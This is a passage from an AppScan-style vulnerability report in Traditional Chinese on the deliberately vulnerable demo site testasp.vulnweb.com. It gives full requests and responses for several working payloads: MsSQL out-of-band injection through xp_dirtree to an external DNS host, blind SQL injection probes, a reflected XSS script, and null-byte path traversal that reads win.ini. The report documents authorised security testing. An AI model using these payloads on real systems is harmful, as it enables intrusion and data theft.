style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:28.571428571428573%;" class="severity_1" title="2"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%">不安全的 Web 應用程式設計或配置</td><td>4</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:42.85714285714286%;" class="severity_1" title="3"></div><div style="width:14.285714285714286%;" class="severity_0" title="1"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%">機密性輸入欄位（如：使用者名稱、密碼和信用卡號碼）傳遞時未加密</td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:14.285714285714286%;" class="severity_1" title="1"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr></table><div id="executiveSummaryThreatClassification" class="h2group" xmlns=""><h2>WASC 威脅分類</h2><a name="executiveSummaryThreatClassification"></a><a class="toclink" href="#toc">目錄</a></div><table class="datatable nowordwrap" xmlns=""><tr><th></th><th>威脅</th><th colspan="2">問題數目</th></tr><tr><td class="severity"></td><td style="width:66%"><a href="http://projects.webappsec.org/Directory-Indexing">目錄檢索</a></td><td>1</td><td style="width:33%"><div style="width:6.25%; height:16px" class="severity_0"></div></td></tr><tr><td class="severity"></td><td style="width:66%"><a href="http://projects.webappsec.org/Server-Misconfiguration">伺服器配置錯誤</a></td><td>2</td><td style="width:33%"><div style="width:12.5%; height:16px" class="severity_0"></div></td></tr><tr><td class="severity"></td><td style="width:66%"><a href="http://projects.webappsec.org/Null-Byte-Injection">空值位元組注入</a></td><td>1</td><td style="width:33%"><div style="width:6.25%; height:16px" class="severity_0"></div></td></tr><tr><td class="severity"></td><td style="width:66%"><a href="http://projects.webappsec.org/Information-Leakage">資訊洩漏</a></td><td>16</td><td style="width:33%"><div style="width:100%; height:16px" class="severity_0"></div></td></tr><tr><td class="severity"></td><td style="width:66%"><a href="http://projects.webappsec.org/Cross-Site+Scripting">跨網站指令碼</a></td><td>3</td><td style="width:33%"><div style="width:18.75%; height:16px" class="severity_0"></div></td></tr><tr><td class="severity"></td><td style="width:66%"><a href="http://projects.webappsec.org/Path-Traversal">路徑遍訪</a></td><td>1</td><td style="width:33%"><div style="width:6.25%; height:16px" class="severity_0"></div></td></tr><tr><td class="severity"></td><td style="width:66%"><a href="http://projects.webappsec.org/Integer-Overflows">整數溢位</a></td><td>1</td><td style="width:33%"><div style="width:6.25%; height:16px" class="severity_0"></div></td></tr><tr><td class="severity"></td><td style="width:66%"><a href="http://projects.webappsec.org/Abuse-of-Functionality">濫用功能</a></td><td>1</td><td style="width:33%"><div style="width:6.25%; height:16px" class="severity_0"></div></td></tr><tr><td class="severity"></td><td style="width:66%"><a href="http://projects.webappsec.org/SQL-Injection">SQL 注入</a></td><td>2</td><td style="width:33%"><div style="width:12.5%; height:16px" class="severity_0"></div></td></tr></table>
             
            
            <input type="hidden" name="sectionstart" />
             
            
			
            <h1 id="issuesByIssueType"><a name="issuesByIssueType"></a>依問題類型分組的問題</h1><div id="attBlindSqlInjectionADNSMSSQL" class="issueType" xmlns=""><div class="severity severity_6">重</div><div><h2 class="nowordwrap"><a href="#attBlindSqlInjectionADNSMSSQL">MsSQL 盲目 SQL 注入（頻外）</a>
					 
					<span class="count">1</span><a name="attBlindSqlInjectionADNSMSSQL"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						1</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attBlindSqlInjectionADNSMSSQL">MsSQL 盲目 SQL 注入（頻外）</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_6">重大</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">9.4</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L" target="_blank">AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/showthread.asp">http://testasp.vulnweb.com/showthread.asp</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">id (Parameter)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能檢視、修改或刪除資料庫項目和表格</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>未正確地消毒使用者所輸入的危險字元</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attBlindSqlInjectionADNSMSSQL_Adv">檢查危險字元注入可能的解決方案</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">AppScan 外部 DNS 伺服器收到一個 DNS 查詢，其中包含此測試的「變式 ID」，因此認定應用程式有弱點。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET /showthread.asp?<span class="mark">id=0%3Bexec+master+..xp_dirtree+%27%5C%5Cv3-ping-21-4bdf443d-bf44-46ad-89de-ad008e710c31.adns.appsechcl.com%5Cdir%27--</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Referer: http://testasp.vulnweb.com/showforum.asp?id=0
Connection: keep-alive
Cookie: ASPSESSIONIDQQQQQDST=KJAADCMBDOAHLOHGBDMAGNIB
Content-Length: 0




/**
AppScan message: The response body is omitted as it is not needed to detect the vulnerability.
**/</div></div><div id="attBlindSqlInjectionStrings" class="issueType" xmlns=""><div class="severity severity_6">重</div><div><h2 class="nowordwrap"><a href="#attBlindSqlInjectionStrings">盲目的 SQL 注入</a>
					 
					<span class="count">1</span><a name="attBlindSqlInjectionStrings"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						1</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attBlindSqlInjectionStrings">盲目的 SQL 注入</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_6">重大</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">9.4</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L" target="_blank">AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/showthread.asp">http://testasp.vulnweb.com/showthread.asp</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">id (Parameter)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能檢視、修改或刪除資料庫項目和表格</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>未正確地消毒使用者所輸入的危險字元</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attBlindSqlInjectionStrings_Adv">檢查危險字元注入可能的解決方案</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">測試結果似乎指出有弱點，因為結果顯示該值可以附加至參數值，這表示其已內嵌在 SQL 查詢中。在此測試中，傳送了三個（有時四個）要求。最後一項要求在邏輯上等於原始要求，而倒數第二項要求則有所不同。任何其他要求都是當作控制之用。最後兩個回應與第一個回應的比較（最後一項和它類似，而倒數第二項則有所不同）指出應用程式有弱點。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET /showthread.asp?id=0 HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Referer: http://testasp.vulnweb.com/showforum.asp?id=0
Connection: keep-alive
Cookie: ASPSESSIONIDQQQQQDST=KJAADCMBDOAHLOHGBDMAGNIB
Content-Length: 0


HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:34:27 GMT
Content-Length: 6192


&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
&lt;html&gt;&lt;!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" --&gt;
&lt;head&gt;
&lt;!-- InstanceBeginEditable name="doctitle" --&gt;
&lt;title&gt;acuforum
Home page
&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
&lt;!-- InstanceBeginEditable name="head" --&gt;&lt;!-- InstanceEndEditable --&gt;
&lt;link href="styles.css" rel="stylesheet" type="text/css"&gt;
&lt;/head&gt;
&lt;body&gt; 
&lt;table width="100%"  border="0" cellpadding="10" cellspacing="0"&gt; 
  &lt;tr bgcolor="#008F00"&gt; 
    &lt;td width="306px"&gt;&lt;a href="https://www.acunetix.com/"&gt;&lt;img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td align="right" valign="middle" bgcolor="#008F00" class="disclaimer"&gt;TEST and Demonstration site for &lt;a href="https://www.acunetix.com/vulnerability-scanner/"&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;div class="menubar"&gt;&lt;a href="Templatize.asp?item=html/about.html" class="menu"&gt;about&lt;/a&gt; - &lt;a href="Default.asp" class="menu"&gt;forums&lt;/a&gt; - &lt;a href="Search.asp" class="menu"&gt;search&lt;/a&gt; 
     - &lt;a href="./Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0" class="menu"&gt;login&lt;/a&gt; - &lt;a href="./Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0" class="menu"&gt;register&lt;/a&gt; 
	- &lt;a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu"&gt;SQL scanner&lt;/a&gt; - &lt;a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu"&gt;SQL vuln help&lt;/a&gt;
    &lt;/div&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;!-- InstanceBeginEditable name="MainContentLeft" --&gt;
		&lt;div class="path"&gt;
			&lt;a href="showforum.asp?id=0"&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;/Home page
		&lt;/div&gt;
      &lt;table width="100%" cellspacing="1" cellpadding="5" bgcolor="#E5E5E5"&gt;
        &lt;tr&gt;&lt;td valign='top' align='center' bgcolor='#FFFFFF' width='120'&gt;&lt;img src='avatars/noavatar.gif'&gt;&lt;br&gt;posted by &lt;b&gt;frenual&lt;/b&gt; on 1/13/2025 3:33:17 AM&lt;/td&gt;&lt;td valign='top' bgcolor='#FFFFFF'&gt;&lt;div class='posttitle'&gt;Home page - 80.239.178.67&lt;/div&gt;&lt;div class='posttext'&gt;https://kinozapas.io/ &lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign='top' align='center' bgcolor='#FFFFFF' width='120'&gt;&lt;img src='avatars/noavatar.gif'&gt;&lt;br&gt;posted by &lt;b&gt;Pedro Miguel&lt;/b&gt; on 1/13/2025 6:27:00 AM&lt;/td&gt;&lt;td valign='top' bgcolor='#FFFFFF'&gt;&lt;div class='posttitle'&gt;This is a subject - 44.209.217.93&lt;/div&gt;&lt;div 
...
...
...

&lt;/body&gt;
&lt;!-- InstanceEnd --&gt;&lt;/html&gt;


GET /showthread.asp?<span class="mark">id=0%2B0%2B0%2B0</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
...
...
...

&lt;/body&gt;
&lt;!-- InstanceEnd --&gt;&lt;/html&gt;


GET /showthread.asp?<span class="mark">id=12345%2B12345%2B0</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
...
...
...

&lt;/body&gt;
&lt;/html&gt;


GET /showthread.asp?<span class="mark">id=12345-1234-0</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
...
...
...

&lt;/body&gt;
&lt;/html&gt;


GET /showthread.asp?<span class="mark">id=12345-12345%2B0</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
...
...
...
</div></div>
				 
				
				<input type="hidden" name="sectionstart" xmlns="" />
				 
				
			<div id="attCrossSiteScripting" class="issueType" xmlns=""><div class="severity severity_3">高</div><div><h2 class="nowordwrap"><a href="#attCrossSiteScripting">反映型跨網站指令碼</a>
					 
					<span class="count">1</span><a name="attCrossSiteScripting"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						1</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attCrossSiteScripting">反映型跨網站指令碼</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_3">高</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">7.1</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L" target="_blank">AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/Search.asp">http://testasp.vulnweb.com/Search.asp</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">tfSearch (Parameter)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能竊取或操作客戶階段作業和 Cookie，並可能用來假冒合法的使用者，讓駭客可以檢視或變更使用者記錄，以及用該使用者的身分來執行交易</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>未正確地消毒使用者所輸入的危險字元</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attCrossSiteScripting_Adv">檢查危險字元注入可能的解決方案</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">測試結果似乎指出有弱點，因為 AppScan 已順利將 Script 內嵌在回應中，且會在頁面載入使用者的瀏覽器時執行。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET /Search.asp?<span class="mark">tfSearch="/&gt;&lt;script&gt;alert(83)&lt;/script&gt;</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Referer: http://testasp.vulnweb.com/Search.asp
Connection: keep-alive
Cookie: ASPSESSIONIDQQQQQDST=DOHPCCMBIHPPLOKMAEABPKDG
Content-Length: 0


HTTP/1.1 <span class="highlight">200</span> <span class="highlight">OK
Cache</span>-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:32:41 GMT
Content-Length: 3079


&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
&lt;html&gt;&lt;!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" --&gt;
&lt;head&gt;
&lt;!-- InstanceBeginEditable name="doctitle" --&gt;
&lt;title&gt;acuforum search&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
&lt;!-- InstanceBeginEditable name="head" --&gt;&lt;!-- InstanceEndEditable --&gt;
&lt;link href="styles.css" rel="stylesheet" type="text/css"&gt;
&lt;/head&gt;
&lt;body&gt; 
&lt;table width="100%"  border="0" cellpadding="10" cellspacing="0"&gt; 
  &lt;tr bgcolor="#008F00"&gt; 
    &lt;td width="306px"&gt;&lt;a href="https://www.acunetix.com/"&gt;&lt;img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td align="right" valign="middle" bgcolor="#008F00" class="disclaimer"&gt;TEST and Demonstration site for &lt;a href="https://www.acunetix.com/vulnerability-scanner/"&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;div class="menubar"&gt;&lt;a href="Templatize.asp?item=html/about.html" class="menu"&gt;about&lt;/a&gt; - &lt;a href="Default.asp" class="menu"&gt;forums&lt;/a&gt; - &lt;a href="Search.asp" class="menu"&gt;search&lt;/a&gt; 
     - &lt;a href="./Login.asp?RetURL=%2FSearch%2Easp%3FtfSearch%3D%22%2F%3E%3Cscript%3E<span class="highlight">alert%2883%29</span>%3C%2Fscript%3E" class="menu"&gt;login&lt;/a&gt; - &lt;a href="./Register.asp?RetURL=%2FSearch%2Easp%3FtfSearch%3D%22%2F%3E%3Cscript%3Ealert%2883%29%3C%2Fscript%3E" class="menu"&gt;register&lt;/a&gt; 
	- &lt;a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu"&gt;SQL scanner&lt;/a&gt; - &lt;a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu"&gt;SQL vuln help&lt;/a&gt;
    &lt;/div&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;!-- InstanceBeginEditable name="MainContentLeft" --&gt;
      &lt;form name="frmSearch" method="get" action=""&gt;
        &lt;div class="FramedForm"&gt;
          &lt;input name="tfSearch" type="text" class="search"&gt;
          &lt;input class="search" type="submit" value="search posts"&gt;
        &lt;/div&gt;
      &lt;/form&gt;      
        &lt;div class='path'&gt;You searched for '"/&gt;&lt;script&gt;alert(83)&lt;/script&gt;'&lt;/div&gt;&lt;table width="100%" cellspacing="1" cellpadding="5" bgcolor="#E5E5E5"&gt;&lt;/table&gt;      
      &lt;!-- InstanceEndEditable --&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr align="right" bgcolor="#FFFFFF"&gt; 
    &lt;td colspan="2" class="footer"&gt;Copyright 2019 Acunetix Ltd.&lt;/td&gt; 
  &lt;/tr&gt; 
&lt;/table&gt; 
&lt;div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px"&gt;
	&lt;p style="padding-left:20%;padding-right:20%"&gt;&lt;b&gt;Warning&lt;/b&gt;: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.&lt;/p&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;!-- InstanceEnd --&gt;&lt;/html&gt;
</div></div><div id="attNullByte" class="issueType" xmlns=""><div class="severity severity_3">高</div><div><h2 class="nowordwrap"><a href="#attNullByte">擷取毒害空值位元組 Windows 檔案</a>
					 
					<span class="count">1</span><a name="attNullByte"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						1</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attNullByte">擷取毒害空值位元組 Windows 檔案</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_3">高</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">7.5</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N" target="_blank">AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/Templatize.asp">http://testasp.vulnweb.com/Templatize.asp</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">item (Parameter)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能檢視 Web 伺服器上任何檔案（例如：資料庫、使用者資訊或配置檔）的內容，但受 Web 伺服器使用者的許可權限制</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>未正確地消毒使用者所輸入的危險字元</li><li>未檢查使用者輸入是否有 '..' （雙點）字串</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attNullByte_Adv">確定所存取的檔案位於虛擬路徑中，且具有特定副檔名；從使用者輸入移除特殊字元</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">測試結果似乎表明存在弱點，因為回應中包含「win.ini」/「boot.ini」檔案的內容，證明伺服器允許遠端使用者下載系統檔案的內容。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET /Templatize.asp?<span class="mark">item=/../../../../../../../../../../../../windows/win.ini%00.html</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Referer: http://testasp.vulnweb.com/
Connection: keep-alive
Cookie: ASPSESSIONIDQQQQQDST=DOHPCCMBIHPPLOKMAEABPKDG
Content-Length: 0


HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:32:05 GMT
Content-Length: 2937


&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
&lt;html&gt;&lt;!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" --&gt;
&lt;head&gt;
&lt;!-- InstanceBeginEditable name="doctitle" --&gt;
&lt;title&gt;Untitled Document&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
&lt;!-- InstanceBeginEditable name="head" --&gt;&lt;!-- InstanceEndEditable --&gt;
&lt;link href="styles.css" rel="stylesheet" type="text/css"&gt;
&lt;/head&gt;
&lt;body&gt; 
&lt;table width="100%"  border="0" cellpadding="10" cellspacing="0"&gt; 
  &lt;tr bgcolor="#008F00"&gt; 
    &lt;td width="306px"&gt;&lt;a href="https://www.acunetix.com/"&gt;&lt;img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td align="right" valign="middle" bgcolor="#008F00" class="disclaimer"&gt;TEST and Demonstration site for &lt;a href="https://www.acunetix.com/vulnerability-scanner/"&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;div class="menubar"&gt;&lt;a href="Templatize.asp?item=html/about.html" class="menu"&gt;about&lt;/a&gt; - &lt;a href="Default.asp" class="menu"&gt;forums&lt;/a&gt; - &lt;a href="Search.asp" class="menu"&gt;search&lt;/a&gt; 
     - &lt;a href="./Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3D%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fwindows%2Fwin%2Eini%2500%2Ehtml" class="menu"&gt;login&lt;/a&gt; - &lt;a href="./Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3D%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fwindows%2Fwin%2Eini%2500%2Ehtml" class="menu"&gt;register&lt;/a&gt; 
	- &lt;a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu"&gt;SQL scanner&lt;/a&gt; - &lt;a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu"&gt;SQL vuln help&lt;/a&gt;
    &lt;/div&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;!-- InstanceBeginEditable name="MainContentLeft" --&gt;
		; for <span class="highlight">16-bit app support</span>
<span class="highlight">[fonts]</span>
<span class="highlight">[extensions]</span>
[mci extensions]
[files]
[Mail]
MAPI=1

		&lt;!-- InstanceEndEditable --&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr align="right" bgcolor="#FFFFFF"&gt; 
    &lt;td colspan="2" class="footer"&gt;Copyright 2019 Acunetix Ltd.&lt;/td&gt; 
  &lt;/tr&gt; 
&lt;/table&gt; 
&lt;div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px"&gt;
	&lt;p style="padding-left:20%;padding-right:20%"&gt;&lt;b&gt;Warning&lt;/b&gt;: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.&lt;/p&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;!-- InstanceEnd --&gt;&lt;/html&gt;
</div></div><div id="attIntegerOverflow" class="issueType" xmlns=""><div class="severity severity_3">高</div><div><h2 class="nowordwrap"><a href="#attIntegerOverflow">整數溢位</a>
					 
					<span class="count">1</span><a name="attIntegerOverflow"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
